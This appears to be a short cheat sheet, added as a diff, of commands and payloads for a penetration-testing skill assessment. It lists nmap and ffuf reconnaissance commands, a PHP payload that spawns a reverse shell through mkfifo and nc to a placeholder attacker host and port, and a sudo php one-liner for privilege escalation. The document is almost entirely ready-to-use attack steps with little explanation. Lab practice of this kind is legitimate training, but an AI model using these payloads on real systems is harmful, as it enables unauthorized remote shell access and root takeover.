@@ -1,0 +1,13 @@
+# This is the commands and payloads using for this skill assessment.
+# Please try anything yourself before read this cheatsheet or write up.
+- Information Gathering:
+nmap -sC -sV -vv -p- <Target_IP>
+ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -u 'http://domain/FUZZ'
+
+- Exploit payload:
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc AttackerIP ATTACKERPORT >/tmp/f"); ?>
+
+- Privilege Escalation:
+CMD="/bin/sh"
+sudo php -r "system('$CMD');"
+
